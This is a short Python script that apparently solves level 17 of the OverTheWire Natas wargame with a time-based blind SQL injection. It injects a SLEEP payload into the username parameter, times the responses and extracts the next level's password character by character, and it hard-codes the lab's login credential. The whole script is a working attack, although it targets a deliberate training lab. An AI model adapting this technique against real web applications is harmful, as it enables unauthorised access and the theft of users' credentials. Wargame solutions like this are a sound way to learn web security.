import requests
import string
import time

url = "http://natas17.natas.labs.overthewire.org"
auth = ("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

# session reuse = huge speed boost
session = requests.Session()
session.auth = auth

chars = string.ascii_letters + string.digits
password = ""

THRESHOLD = 4  # adjust if needed

while True:
    found = False

    for c in chars:
        attempt = password + c

        payload = f'natas18" AND password LIKE BINARY "{attempt}%" AND SLEEP(5) -- -'

        start = time.perf_counter()

        try:
            session.get(
                url,
                params={"username": payload},
                timeout=10
            )
        except requests.exceptions.RequestException:
            continue

        elapsed = time.perf_counter() - start

        print(f"Trying: {attempt} | {elapsed:.2f}s")

        if elapsed > THRESHOLD:
            password += c
            print(f"[+] Found so far: {password}")
            found = True
            break

    if not found:
        print(f"[✓] Final password: {password}")
        break